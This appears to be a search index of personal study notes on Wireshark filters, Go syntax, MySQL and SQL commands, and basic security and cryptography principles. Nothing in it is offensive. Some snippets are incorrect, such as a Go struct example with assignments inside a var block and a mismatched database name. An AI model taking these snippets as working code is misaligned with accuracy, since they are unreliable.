{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"wireshark/","title":"Wireshark","text":""},{"location":"wireshark/#filters","title":"Filters","text":""},{"location":"wireshark/#capture_filters","title":"Capture Filters","text":"<p>BPF (Berkeley Packet Filter)\u200b\u200b Syntax <pre><code>[Protocol][Direction][Host/Net]\n</code></pre> Protocol\u200b: ether, ip, ip6, arp, tcp, udp, icmp Direction: src / dst Host / Net: host 192.168.1.1, net 192.168.1.0/24, port 80, portrange 1-1024</p> <p>Logical Operations\u200b: and (&amp;&amp;), or (||), not (!)</p>"},{"location":"wireshark/#display_filters","title":"Display Filters","text":"<p>Wireshark Syntax</p> <p>Port Filter <pre><code>tcp.port==80\ntcp.dstport==80\ntcp.srcport==80\n</code></pre></p> <p>Protocol Filter <pre><code>http\ntcp\nssh\n</code></pre></p> <p>http Filter <pre><code>http.request.method==\"GET\"\n</code></pre></p>"},{"location":"Go/syntax/","title":"Go","text":""},{"location":"Go/syntax/#go","title":"Go","text":""},{"location":"Go/syntax/#packages","title":"Packages <p>Every Go program is made up of packages.</p> <p>Programs start running in package <code>main</code>.</p>","text":""},{"location":"Go/syntax/#import","title":"import","text":"<p><pre><code>import (\n    \"fmt\"\n    \"math\"\n)\n</code></pre> <pre><code>import \"fmt\"\nimport \"math\"\n</code></pre> the package name is the same as the last element of the import path</p>"},{"location":"Go/syntax/#exported_names","title":"Exported names","text":"<p>In Go, a name is exported if it begins with a capital letter <code>math.pi</code> \u00d7 <code>math.Pi</code> \u221a</p>"},{"location":"Go/syntax/#functions","title":"Functions <p><pre><code>func add(x int, y int) int {\n    return x + y\n}\n</code></pre> multiple results <pre><code>func swap(x, y string) (string, string) {\n    return y, x\n}\n\nfunc main() {\n    a, b := swap(\"hello\", \"world\")\n    fmt.Println(a, b)\n}\n</code></pre> Named return values <pre><code>func split(sum int) (x, y int) {\n    x = sum * 4 / 9\n    y = sum - x\n    return\n}\n\nfunc main() {\n    a, b := split(17)\n}\n</code></pre></p>","text":""},{"location":"Go/syntax/#variables","title":"Variables","text":""},{"location":"Go/syntax/#declaration_initialization","title":"Declaration &amp; Initialization","text":"<p><pre><code>var i int\nvar j = 1\nvar (\n    ToBe   bool       = false\n    MaxInt uint64     = 1&lt;&lt;64 - 1\n    z      complex128 = cmplx.Sqrt(-5 + 12i)\n)\nk := 2  // function level only\n</code></pre> Outside a function, every statement begins with a keyword (<code>var</code>, <code>func</code>, and so on) and so the <code>:=</code> construct is not available.</p> <p>Variables declared without an explicit initial value are given their zero value - <code>0</code> for numeric types, - <code>false</code> for the boolean type, and - <code>\"\"</code> (the empty string) for strings.</p>"},{"location":"Go/syntax/#basic_types","title":"Basic Types","text":"<pre><code>bool\n\nstring\n\nint  int8  int16  int32  int64\nuint uint8 uint16 uint32 uint64 uintptr\n\nbyte // alias for uint8\n\nrune // alias for int32\n     // represents a Unicode code point\n\nfloat32 float64\n\ncomplex64 complex128\n</code></pre>"},{"location":"Go/syntax/#type_conversions","title":"Type Conversions","text":"<p>The expression <code>T(v)</code> converts the value <code>v</code> to the type <code>T</code>.</p>"},{"location":"Go/syntax/#type_inference","title":"Type inference","text":"<p>When declaring a variable without specifying an explicit type, the variable's type is inferred from the value on the right hand side. <pre><code>i := 42           // int\nf := 3.142        // float64\ng := 0.867 + 0.5i // complex128\n</code></pre></p>"},{"location":"Go/syntax/#constants","title":"Constants <p><pre><code>const identifier [type] = value\n</code></pre> An untyped constant takes the type needed by its context.</p> <p>Numeric constants are high-precision values.</p>","text":""},{"location":"Go/syntax/#control_flow","title":"Control Flow","text":""},{"location":"Go/syntax/#iteration","title":"Iteration","text":"<p><pre><code>for i := 0; i &lt; 10; i++ {\n    sum += i\n}\n</code></pre> The init and post statements are optional. <code>for</code> is Go's <code>while</code> <pre><code>sum := 1\nfor sum &lt; 1000 {\n    sum += sum\n}\n</code></pre> forever <pre><code>for {\n}\n</code></pre></p>"},{"location":"Go/syntax/#conditon","title":"Conditon","text":""},{"location":"Go/syntax/#if","title":"If","text":"<pre><code>if x &lt; 1 { fmt.Println(x) }\n</code></pre> <p>if with a short statement <pre><code>if v := math.Pow(x, n); v &lt; lim {\n    return v\n}\n</code></pre> Variables declared by the statement are only in scope until the end of the <code>if</code></p>"},{"location":"Go/syntax/#if_and_else","title":"If and Else","text":"<p>Variables declared inside an <code>if</code> short statement are also available inside any of the <code>else</code> blocks. <pre><code>if v := math.Pow(x, n); v &lt; lim {\n    return v\n} else {\n    fmt.Printf(\"%g &gt;= %g\\n\", v, lim)\n}\n</code></pre></p>"},{"location":"Go/syntax/#swith","title":"Swith","text":"<p>Switch cases evaluate cases from top to bottom, stopping when a case succeeds. <pre><code>switch os := runtime.GOOS; os {\ncase \"darwin\":\n    fmt.Println(\"macOS.\")\ncase \"linux\":\n    fmt.Println(\"Linux.\")\ndefault:\n    fmt.Printf(\"%s.\\n\", os)\n}\n</code></pre> no <code>break</code>: Go only runs the selected case, not all the cases that follow.</p> <p>switch with no condition  <pre><code>switch {\ncase t.Hour() &lt; 12:\n    fmt.Println(\"Good morning!\")\ncase t.Hour() &lt; 17:\n    fmt.Println(\"Good afternoon.\")\ndefault:\n    fmt.Println(\"Good evening.\")\n}\n</code></pre></p>"},{"location":"Go/syntax/#defer","title":"Defer","text":"<p>The deferred call's arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.</p> <p>Deferred function calls are pushed onto a stack. When a function returns, its deferred calls are executed in last-in-first-out order. <pre><code>func main() {\n    fmt.Println(\"counting\")\n\n    for i := 0; i &lt; 10; i++ {\n        defer fmt.Println(i)\n    }\n\n    fmt.Println(\"done\")\n}\n</code></pre></p>"},{"location":"Go/syntax/#pointers","title":"Pointers","text":"<pre><code>var p *int \ni := 42\np = &amp;i\n*p = 21\n</code></pre>"},{"location":"Go/syntax/#structs","title":"Structs <pre><code>type Vertex struct {\n    X int \n    Y int \n    // or: X, Y int\n}\n\nvar (\n    v1 = Vertex{1, 2} \n    v1.X = 0\n    v2 = Vertex{X: 1}  // Y:0 is implicit\n    v3 = Vertex{}      // X:0 and Y:0\n    p  = &amp;Vertex{1, 2} // has type *Vertex\n    p.X = 3 // use dot notation \n)\n</code></pre>","text":""},{"location":"Go/syntax/#arrays","title":"Arrays <pre><code>func main() {\n    var a [2]string\n    a[0] = \"Hello\"\n    a[1] = \"World\"\n\n    primes := [6]int{2, 3, 5, 7, 11, 13}\n}\n</code></pre>","text":""},{"location":"Go/syntax/#slices","title":"Slices <pre><code>arr[low : high]\n</code></pre> <p>Slices are like references to arrays Changing the elements of a slice modifies the corresponding elements of its underlying array, and vice versa. <pre><code>Slice\n+--------+-----+-----+\n|  ptr   | len | cap |  \u2190 Slice Header\n+--------+-----+-----+\n    |\n    v\n+---+---+---+---+---+---+---+\n| 0 | 1 | 2 | 3 | 4 | 5 | 6 |  \u2190 Underlying Array\n+---+---+---+---+---+---+---+\n</code></pre></p> <ul> <li> <p>The length of a slice is the number of elements it contains.</p> </li> <li> <p>The capacity of a slice is the number of elements in the underlying array, counting from the first element in the slice.</p> </li> </ul>","text":""},{"location":"Go/syntax/#slice_literals","title":"Slice Literals","text":"<p>This is an array literal: <pre><code>[3]bool{true, true, false}\n</code></pre> And this creates the same array as above, then builds a slice that references it: <pre><code>[]bool{true, true, false}\n</code></pre></p>"},{"location":"Go/syntax/#nil_slices","title":"Nil Slices","text":"<p><pre><code>var s []int\n</code></pre> The zero value of a slice is <code>nil</code>. A nil slice has a length and capacity of 0 and has no underlying array.</p>"},{"location":"Go/syntax/#make","title":"Make","text":"<p>Slices can be created with the built-in <code>make</code> function; this is how you create dynamically-sized arrays. <pre><code>a := make([]int, 5)  // len(a)=5\n\nb := make([]int, 0, 5) // len(b)=0, cap(b)=5\nb = b[:cap(b)] // len(b)=5, cap(b)=5\nb = b[1:]      // len(b)=4, cap(b)=4\n</code></pre> 0 \u2264 low \u2264 high \u2264 cap(s) <pre><code>b := make([]int, 0, 5)  // len(b)=0, cap(b)=5\nc := b[:3]  // [0:3] correct\nc := b[2:]  // [2:0] error\n</code></pre></p>"},{"location":"Go/syntax/#slices_of_slices","title":"Slices of slices","text":"<p><pre><code>board := [][]string{\n    []string{\"_\", \"_\", \"_\"},\n    []string{\"_\", \"_\", \"_\"},\n    []string{\"_\", \"_\", \"_\"}, // &lt;- comma here\n}\n</code></pre> <pre><code>+---------------+\n| board0        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n| board1        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n| board2        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n</code></pre></p>"},{"location":"Go/syntax/#appending_to_a_slice","title":"Appending to a slice","text":"<p><pre><code>func append(s []T, vs ...T) []T\n</code></pre> <pre><code>arr := [5]int{1, 2, 3, 4, 5} \ns := arr[:3]                // s = [1, 2, 3], len=3, cap=5\ns = append(s, 6)            // modify the underlying array\nfmt.Println(s)              // [1, 2, 3, 6]\nfmt.Println(arr)            // [1, 2, 3, 6, 5]\n</code></pre> <pre><code>s := []int{1, 2, 3}        \ns = append(s, 4)           // allocate a new, larger underlying array\nfmt.Println(s)             // [1, 2, 3, 4]\nfmt.Println(cap(s))        // maybe 6, denpends on the strategy\n</code></pre></p> <p><pre><code>combinedSlice := append(slice1, slice2...)\n</code></pre> <pre><code>slice1 := []int{1, 2, 3}\nslice2 := []int{4, 5, 6}\n\ncombined := append(slice1, slice2...)\nfmt.Println(combined) // [1 2 3 4 5 6]\n</code></pre></p>"},{"location":"Go/syntax/#range","title":"Range","text":"<p>The <code>range</code> form of the <code>for</code> loop iterates over a slice or map. <pre><code>var pow = []int{1, 2, 4, 8, 16, 32, 64, 128}\n\nfor i, v := range pow {...}\n\nfor i, _ := range pow\nfor i := range pow\n\nfor _, value := range pow\n</code></pre></p>"},{"location":"Go/syntax/#map","title":"Map <p>The zero value of a map is <code>nil</code>. A <code>nil</code> map has no keys, nor can keys be added. <pre><code>var m map[string]int\nm[\"key\"] = 1 // panic: assignment to nil map\n</code></pre> The <code>make</code> function returns a map of the given type, initialized and ready for use. <pre><code>m := make(map[string]int)\nm[\"Alice\"] = 25\n</code></pre></p>","text":""},{"location":"Go/syntax/#map_literals","title":"Map Literals","text":"<p><pre><code>type Vertex struct {\n    Lat, Long float64\n}\n\nvar m = map[string]Vertex{\n    \"Bell Labs\": Vertex{\n        40.68433, -74.39967,\n    },\n    \"Google\": Vertex{\n        37.42202, -122.08408,\n    },\n}\n</code></pre> If the top-level type is just a type name, you can omit it from the elements of the literal. <pre><code>var m = map[string]Vertex{\n    \"Bell Labs\": {40.68433, -74.39967},\n    \"Google\":    {37.42202, -122.08408},\n}\n</code></pre></p>"},{"location":"Go/syntax/#mutating_maps","title":"Mutating Maps","text":"<p><pre><code>m[key] = elem   // insert\nelem = m[key]   // retrieve\ndelete(m, key)  // delete\nelem, ok = m[key]   // Test that a key is present\n// - If key is in m, then elem is the value of key, ok is true\n// - If key is not in the map, then elem is zero value, ok is false\n</code></pre> <pre><code>func WordCount(s string) map[string]int {\n    words := strings.Fields(s) \n    cntmap := make(map[string]int)\n    for _, w := range words {\n        cntmap[w]++     // if w not in cntmap, return zero value! (different from python)\n    }\n    return cntmap\n}\n</code></pre></p>"},{"location":"Go/syntax/#function_value","title":"Function Value","text":"<p>Function values may be used as function arguments and return values. <pre><code>func compute(fn func(float64, float64) float64) float64 {\n    return fn(3, 4)\n}\n\nfunc main() {\n    hypot := func(x, y float64) float64 {\n        return math.Sqrt(x*x + y*y)\n    }\n    fmt.Println(hypot(5, 12))\n\n    fmt.Println(compute(hypot))\n    fmt.Println(compute(math.Pow))\n}\n</code></pre></p>"},{"location":"Go/syntax/#function_closure","title":"Function Closure","text":"<p>A closure is a function value that references variables from outside its body. The function may access and assign to the referenced variables; in this sense the function is \"bound\" to the variables. <pre><code>func adder() func(int) int {\n    sum := 0\n    return func(x int) int {\n        sum += x\n        return sum\n    }\n}\n\nfunc main() {\n    pos, neg := adder(), adder()\n    for i := 0; i &lt; 10; i++ {\n        fmt.Println(\n            pos(i),\n            neg(-2*i),\n        )\n    }\n}\n</code></pre></p>"},{"location":"Go/syntax/#methods","title":"Methods <p>Go does not have classes. However, you can define methods on types.</p> <p>A method is a function with a special receiver argument.</p> <p>The receiver appears in its own argument list between the <code>func</code> keyword and the method name. <pre><code>type Vertex struct {\n    X, Y float64\n}\n\nfunc (v Vertex) Abs() float64 { //  a receiver of type Vertex named v.\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n\nfunc main() {\n    v := Vertex{3, 4}\n    fmt.Println(v.Abs())\n}\n</code></pre> equivalent to  <pre><code>func Abs(v Vertex) float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n</code></pre> You can only declare a method with a receiver whose type is defined in the same package as the method. You cannot declare a method with a receiver whose type is defined in another package (which includes the built-in types such as int). <pre><code>type MyFloat float64\n\nfunc (f MyFloat) Abs() float64 {    // cannot use float64 directly\n    if f &lt; 0 {\n        return float64(-f)\n    }\n    return float64(f)\n}\n</code></pre> With a value receiver, the Scale method operates on a copy of the original Vertex value. Methods with pointer receivers can modify the value to which the receiver points.</p> <pre><code>type Vertex struct {\n    X, Y float64\n}\n\nfunc (v Vertex) Abs() float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n\nfunc (v *Vertex) Scale(f float64) {\n    v.X = v.X * f\n    v.Y = v.Y * f\n}\n\nfunc main() {\n    v := Vertex{3, 4}   \n    v.Scale(10)     // automatically retrieve address &amp;v and pass to Scale\n    fmt.Println(v.Abs())\n}\n</code></pre>","text":""},{"location":"Go/syntax/#pointer_indirection","title":"Pointer indirection","text":"<p>Functions with a pointer argument must take a pointer: <pre><code>var v Vertex\nScaleFunc(v, 5)  // Compile error!\nScaleFunc(&amp;v, 5) // OK\n</code></pre> while methods with pointer receivers take either a value or a pointer as the receiver when they are called: <pre><code>var v Vertex\nv.Scale(5)  // OK\np := &amp;v\np.Scale(10) // OK\n</code></pre> Functions that take a value argument must take a value of that specific type: <pre><code>var v Vertex\nfmt.Println(AbsFunc(v))  // OK\nfmt.Println(AbsFunc(&amp;v)) // Compile error!\n</code></pre> while methods with value receivers take either a value or a pointer as the receiver when they are called: <pre><code>var v Vertex\nfmt.Println(v.Abs()) // OK\np := &amp;v\nfmt.Println(p.Abs()) // OK\n</code></pre></p>"},{"location":"Go/syntax/#interface","title":"Interface <p>An interface type is defined as a set of method signatures.</p>","text":""},{"location":"Go/syntax/#implementation","title":"Implementation","text":"<p>Interfaces are implemented implicitly A type implements an interface by implementing its methods. There is no explicit declaration of intent, no \"implements\" keyword.</p> <p>A value of interface type can hold any value that implements those methods. <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"math\"\n)\n\ntype Abser interface {\n    Abs() float64\n}\n\nfunc main() {\n    var a Abser\n    f := MyFloat(-math.Sqrt2)\n    v := Vertex{3, 4}\n\n    a = f  // a MyFloat implements Abser\n    fmt.Println(a.Abs())    // 1.4142135623730951\n\n    a = &amp;v // a *Vertex implements Abser\n    fmt.Println(a.Abs())    // 5\n\n    // v is a Vertex (not *Vertex) and does NOT implement Abser.\n    a = v   // error\n\n\n}\n\ntype MyFloat float64\n\nfunc (f MyFloat) Abs() float64 {\n    if f &lt; 0 {\n        return float64(-f)\n    }\n    return float64(f)\n}\n\ntype Vertex struct {\n    X, Y float64\n}\n\nfunc (v *Vertex) Abs() float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n</code></pre></p>"},{"location":"Go/syntax/#interface_values","title":"Interface values","text":"<p>Under the hood, interface values can be thought of as a tuple of a value and a concrete type: <pre><code>(value, type)\n</code></pre> An interface value holds a value of a specific underlying concrete type. Calling a method on an interface value executes the method of the same name on its underlying type.</p>"},{"location":"Go/syntax/#interface_values_with_nil_underlying_values","title":"Interface values with nil underlying values","text":"<p>If the concrete value inside the interface itself is nil, the method will be called with a nil receiver.</p> <p>Note that an interface value that holds a nil concrete value is itself non-nil. <pre><code>type I interface {\n    M()\n}\n\ntype T struct {\n    S string\n}\n\nfunc (t *T) M() {\n    if t == nil {\n        fmt.Println(\"&lt;nil&gt;\")\n        return\n    }\n    fmt.Println(t.S)\n}\n\n\nfunc main() {\n    var i I\n    var t *T\n    i = t\n    describe(i)\n    i.M()\n}\n\nfunc describe(i I) {\n    fmt.Printf(\"(%v, %T)\\n\", i, i)\n}\n</code></pre></p>"},{"location":"Go/syntax/#nil_interface_values","title":"Nil interface values","text":"<p>A nil interface value holds neither value nor concrete type.</p> <p>Calling a method on a nil interface is a run-time error because there is no type inside the interface tuple to indicate which concrete method to call. <pre><code>func main() {\n    var i I\n    i.M()   // error\n}\n</code></pre></p>"},{"location":"Go/syntax/#the_empty_interface","title":"The empty interface","text":"<p>The interface type that specifies zero methods is known as the empty interface: <pre><code>interface{}\n</code></pre></p> <p>Empty interfaces are used by code that handles values of unknown type.  For example, <code>fmt.Print</code> takes any number of arguments of type <code>interface{}</code>.</p>"},{"location":"Go/syntax/#type_assertions","title":"Type assertions","text":"<p>A type assertion provides access to an interface value's underlying concrete value. <pre><code>t := i.(T)\n</code></pre> This statement asserts that the interface value i holds the concrete type T and assigns the underlying T value to the variable t. If i does not hold a T, the statement will trigger a panic.</p> <p>To test whether an interface holds a specific type: <pre><code>t, ok := i.(T)\n</code></pre></p>"},{"location":"Go/syntax/#type_switches","title":"Type switches","text":"<p>A type switch is a construct that permits several type assertions in series. <pre><code>switch v := i.(type) {\ncase T:\n    // here v has type T\ncase S:\n    // here v has type S\ndefault:\n    // no match; here v has the same type as i\n}\n</code></pre></p>"},{"location":"Go/syntax/#stringer","title":"Stringer","text":"<p>One of the most ubiquitous interfaces is <code>Stringer</code> defined by the <code>fmt</code> package. <pre><code>type Stringer interface {\n    String() string\n}\n</code></pre> A <code>Stringer</code> is a type that can describe itself as a string. The <code>fmt</code> package (and many others) look for this interface to print values.</p> <p>pseudocode of fmt.Println() <pre><code>func Println(a ...interface{}) {\n    for _, v := range a {\n        if s, ok := v.(fmt.Stringer); ok {\n            // call String() if implemented\n            fmt.Print(s.String())\n        } else {\n            // or use reflection to get the default format \n            fmt.Print(defaultFormat(v))\n        }\n    }\n}\n</code></pre> <pre><code>type Person struct {\n    Name string\n    Age  int\n}\n\nfunc (p Person) String() string {\n    return fmt.Sprintf(\"%v (%v years)\", p.Name, p.Age)\n}\n</code></pre></p>"},{"location":"Go/syntax/#errors","title":"Errors","text":"<pre><code>type error interface {\n    Error() string\n}\n</code></pre> <pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\ntype ErrNegativeSqrt float64\n\nfunc (e ErrNegativeSqrt) Error() string {\n    return fmt.Sprintf(\"cannot Sqrt negative number: %v\", float64(e))\n}\n\nfunc Sqrt(x float64) (float64, error) {\n    if x &lt; 0 {\n        return 0, ErrNegativeSqrt(x)\n    }\n\n    z := 1.0\n    for i := 0; i &lt; 10; i++ {\n        z -= (z*z - x) / (2 * z)\n    }\n    return z, nil\n}\n\nfunc main() {\n    fmt.Println(Sqrt(2))\n    fmt.Println(Sqrt(-2))\n}\n</code></pre>"},{"location":"Go/syntax/#readers","title":"Readers","text":""},{"location":"Go/syntax/#images","title":"Images","text":"<p>Package image defines the Image interface: <pre><code>package image\n\ntype Image interface {\n    ColorModel() color.Model\n    Bounds() Rectangle\n    At(x, y int) color.Color\n}\n</code></pre></p>"},{"location":"Go/syntax/#generics","title":"Generics","text":""},{"location":"Go/syntax/#generic_functions","title":"Generic functions","text":"<p>Go functions can be written to work on multiple types using type parameters.  The type parameters of a function appear between brackets, before the function's arguments. <pre><code>func Index[T comparable](s []T, x T) int {\n    for i, v := range s {\n        // v and x are type T, which has the comparable\n        // constraint, so we can use == here.\n        if v == x {\n            return i\n        }\n    }\n    return -1\n}\n\nfunc main() {\n    si := []int{10, 20, 15, -10}\n    fmt.Println(Index(si, 15))\n\n    ss := []string{\"foo\", \"bar\", \"baz\"}\n    fmt.Println(Index(ss, \"hello\"))\n}\n</code></pre></p>"},{"location":"Go/syntax/#generic_types","title":"Generic types","text":"<p>A type can be parameterized with a type parameter, which could be useful for implementing generic data structures. <pre><code>type List[T any] struct {\n    next *List[T]\n    val  T\n}\n\nfunc InsertAtHead[T any](head **List[T], value T) {\n    newNode := &amp;List[T]{val: value, next: *head}\n    *head = newNode\n}\n\nfunc InsertAtTail[T any](head **List[T], value T) {\n    newNode := &amp;List[T]{val: value, next: nil}\n    if *head == nil {\n        *head = newNode\n        return\n    }\n    current := *head\n    for current.next != nil {\n        current = current.next\n    }\n    current.next = newNode\n}\n\nfunc main() {\n    var head *List[int]\n    node := &amp;List[int]{\n        val:  42,      \n        next: nil,\n    }\n\n    InsertAtHead(&amp;head, 1)\n}\n</code></pre></p>"},{"location":"SQL/MySQL/","title":"MySQL","text":""},{"location":"SQL/MySQL/#mysql","title":"MySQL \u57fa\u672c\u547d\u4ee4   <ul> <li>Note that all text commands must be first on line and end with ';'</li> <li>\u5927\u5c0f\u5199\u90fd\u53ef\u4ee5</li> </ul>","text":""},{"location":"SQL/MySQL/#_1","title":"\u6570\u636e\u5e93\u64cd\u4f5c","text":"<p>\u67e5\u770b\u6570\u636e\u5e93 <pre><code>SHOW DATABASES;\n</code></pre></p> <p>\u521b\u5efa\u6570\u636e\u5e93 <pre><code>CREATE DATABASE my_database;\n</code></pre></p> <p>\u4f7f\u7528\u6570\u636e\u5e93 <pre><code>USE my_databases;\n</code></pre></p> <p>\u5bfc\u5165\u548c\u5bfc\u51fa\u6570\u636e\u5e93 - \u5bfc\u5165 <pre><code>mysql -u root -p my_database &lt; /path/to/file.sql\n</code></pre> - \u5bfc\u51fa <pre><code>mysqldump -u root -p my_database &gt; /path/to/file.sql\n</code></pre></p> <p>\u5220\u9664\u6570\u636e\u5e93 <pre><code>DROP DATABASE my_database;\n</code></pre></p>"},{"location":"SQL/MySQL/#_2","title":"\u6570\u636e\u8868\u64cd\u4f5c","text":"<p>\u67e5\u770b\u8868 <pre><code>SHOW TABLES;\n</code></pre></p> <p>\u521b\u5efa\u8868 <pre><code>CREATE TABLE users (\n    id INT AUTO_INCREMENT PRIMARY KEY,\n    name VARCHAR(100),\n    email VARCHAR(100)\n);\n</code></pre></p> <p>\u67e5\u770b\u8868\u7ed3\u6784 <pre><code>DESCRIBE users;\nDESC users;  -- \u7b80\u5199\nSHOW COLUMNS FROM users;\n</code></pre></p> <p>\u4fee\u6539\u8868\u7ed3\u6784 <pre><code>ALTER TABLE table_name ADD column_name datatype;  -- \u6dfb\u52a0\u5217\nALTER TABLE table_name DROP COLUMN column_name;  -- \u5220\u9664\u5217\nALTER TABLE table_name MODIFY COLUMN column_name new_datatype;  -- \u4fee\u6539\u5217\u7c7b\u578b\nALTER TABLE table_name RENAME TO new_table_name;  -- \u91cd\u547d\u540d\u8868\n</code></pre></p> <p>\u5220\u9664\u6570\u636e\u8868 <pre><code>DROP TABLE users;\n</code></pre></p>"},{"location":"SQL/MySQL/#dml","title":"\u6570\u636e\u64cd\u4f5c (DML)","text":"<p>\u63d2\u5165\u6570\u636e <pre><code>INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');\n-- \u63d2\u5165\u591a\u884c\nINSERT INTO table_name (column1, column2, ...) \nVALUES \n    (value1, value2, ...),\n    (value1, value2, ...),\n    ...;\n</code></pre></p> <p>\u67e5\u8be2\u6570\u636e\uff08\u67e5\u8868\uff09 <pre><code>SELECT \n    field1,field2, ...\nFROM \n    table1,table2,...\n[WHERE condition1 AND/OR condition2...]\n[GROUP BY column_name]\n[HAVING group_condition]\n[ORDER BY column_name [ASC|DESC]]\n[LIMIT [offset,] row_count];\n</code></pre></p> <ul> <li>\u57fa\u672c\u67e5\u8be2 <pre><code>SELECT * FROM table_name;  -- \u67e5\u8be2\u6240\u6709\u5217\nSELECT column1, column2 FROM table_name;  -- \u67e5\u8be2\u7279\u5b9a\u5217\n</code></pre></li> <li>\u6761\u4ef6\u67e5\u8be2 <pre><code>SELECT * FROM table_name WHERE column1 = value;\nSELECT * FROM table_name WHERE column1 &gt; value;\nSELECT * FROM table_name WHERE NOT column1 = value;\nSELECT * FROM table_name WHERE column1 BETWEEN value1 AND value2;\nSELECT * FROM table_name WHERE column1 LIKE 'pattern%';\nSELECT * FROM table_name WHERE column1 IN (value1, value2, ...);\n</code></pre></li> <li>\u6392\u5e8f <pre><code>SELECT * FROM table_name ORDER BY column1 DESC;  \n-- ASC\uff08\u9ed8\u8ba4\uff09ascending/ DESC descending\nSELECT * FROM table_name ORDER BY 1;  \n-- \u4e5f\u53ef\u4ee5\u7528\u7d22\u5f15\uff08\u4ece1\u5f00\u59cb\uff09\n</code></pre></li> <li> <p>\u9650\u5236 <pre><code>SELECT * FROM table_name LIMIT 10;  -- \u524d10\u6761\nSELECT * FROM table_name LIMIT 5, 10;  -- \u4ece\u7b2c6\u6761\u5f00\u59cb\u768410\u6761\n</code></pre></p> </li> <li> <p>\u6574\u5408 <pre><code>SELECT CONCAT(col_name1,col_name2...) FROM tabel_name//\u6574\u5408\u5217\u6570\u636e\nSELECT GROUP_CONCAT(col_name1,col_name2...) FROM tabel_name//\u6574\u5408\u884c\u3001\u5217\u6570\u636e\uff08\u5148\u5217\u518d\u884c\uff09\n</code></pre> \u6548\u679c </p> </li> <li> <p>\u8054\u5408\u67e5\u8be2 <pre><code>-- \u5408\u5e76\u4e24\u4e2a\u67e5\u8be2\u7ed3\u679c\nSELECT ...\nUNION\nSELECT ...\n</code></pre> \u6ce8\u610f\u524d\u540e\u5217\u6570\u4e00\u81f4 </p> </li> <li> <p>\u805a\u5408\u51fd\u6570 <pre><code>SELECT COUNT(*) FROM table_name;\nSELECT SUM(column1) FROM table_name;\nSELECT AVG(column1) FROM table_name;\nSELECT MAX(column1) FROM table_name;\nSELECT MIN(column1) FROM table_name;\n</code></pre></p> </li> <li> <p>\u5206\u7ec4\u67e5\u8be2 <pre><code>SELECT column1, COUNT(*) \nFROM table_name \nGROUP BY column1\nHAVING COUNT(*) &gt; 5;\n</code></pre></p> </li> </ul> <p>\u66f4\u65b0\u6570\u636e <pre><code>UPDATE users \nSET email = 'john.doe@example.com' \nWHERE name = 'John Doe';\n</code></pre></p> <p>\u5220\u9664\u6570\u636e <pre><code>DELETE FROM users WHERE name = 'John Doe';\n</code></pre></p> <p>\u4f7f\u7528\u5e2e\u52a9 <pre><code>HELP;\nHELP SHOW;//\u67e5\u770b\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\n</code></pre></p>"},{"location":"SQL/SQL/","title":"SQL","text":""},{"location":"SQL/SQL/#creating_tables","title":"Creating Tables","text":"<pre><code>CREATE TABLE [table_name] AS\n  SELECT [val1] AS [column1], [val2] AS [column2], ... UNION\n  SELECT [val3]             , [val4]             , ... UNION\n  SELECT [val5]             , [val6]             , ...;\n</code></pre>"},{"location":"SQL/SQL/#selecting_from_tables","title":"Selecting From Tables","text":""},{"location":"SQL/enter/","title":"Enter","text":""},{"location":"SQL/enter/#mysql","title":"\u8fdb\u5165MySQL  <p>1. phpstudy_pro \u4e2d\u542f\u52a8MySQL 2. \u8fdb\u5165\u7ec8\u7aef </p>","text":""},{"location":"cs161/principles/","title":"Principles","text":""},{"location":"cs161/principles/#security_principles","title":"Security Principles","text":""},{"location":"cs161/principles/#threat_model","title":"Threat Model","text":"<p>A threat model is a model of who your attacker is and what resources they have. Understanding your threat model has to do with understanding who and why might someone attack you</p> <p>common assumptions</p>"},{"location":"cs161/principles/#consider_human_factors","title":"Consider Human Factors","text":"<p>Security systems must be usable by ordinary people, and therefore must be designed to take into account the role that humans will play. </p>"},{"location":"cs161/principles/#detect","title":"Detect","text":""},{"location":"cs161/principles/#defense_in_depth","title":"Defense in depth","text":"<p>Multiple types of defenses should be layered together so an attacker would have to breach all the defenses to successfully attack a system.</p>"},{"location":"cs161/principles/#least_privilege","title":"Least Privilege","text":"<p>Try to minimize how much privilege you give each program and system component.</p>"},{"location":"cs161/principles/#seperation_of_responsipility","title":"Seperation of responsipility","text":"<p>Split up privilege, so no one person or program has complete power. Require more than one party to approve before access is granted.</p>"},{"location":"cs161/principles/#ensure_complete_mediation","title":"Ensure complete mediation","text":"<p>When enforcing access control policies, make sure that you check every access to every object.</p> <p>Time-Of-Check To Time-Of-Use (TOCTTOU) vulnerability</p>"},{"location":"cs161/principles/#shannons_maxim","title":"Shannon's Maxim","text":"<p>Shannon\u2019s Maxim states that the attacker knows the system that they are attacking.</p> <p>\u201cSecurity through obscurity\u201d refers to systems that rely on the secrecy of their design, algorithms, or source code to be secure.</p> <p>A closely related principle is Kerckhoff\u2019s Principle, which states that cryptographic systems should remain secure even when the attacker knows all internal details of the system.</p>"},{"location":"cs161/principles/#fail-safe_defaults","title":"Fail-Safe Defaults","text":"<p>Choose default settings that \u201cfail safe\u201d, balancing security with usability when a system goes down.</p>"},{"location":"cs161/principles/#trusted_computing_base_tcb","title":"Trusted Computing Base (TCB)","text":""},{"location":"cs161/Cryptography/asymmetric/","title":"Asymmetric","text":""},{"location":"cs161/Cryptography/asymmetric/#asymmetric_cryptography","title":"Asymmetric cryptography  \\[ \\begin{aligned} KeyGen()-&gt;(PK,SK)\\\\ Enc(M, PK)-&gt;C\\\\ Dec(C, SK)-&gt;M \\end{aligned} \\]","text":""},{"location":"cs161/Cryptography/asymmetric/#trapdoor_one-way_functions","title":"Trapdoor One-way Functions","text":"<p>A trapdoor one-way function is a function that is one-way, but also has a special backdoor that enables someone who knows the backdoor to invert the function. - one-way: encryption with public key - backdoor: decryption with private 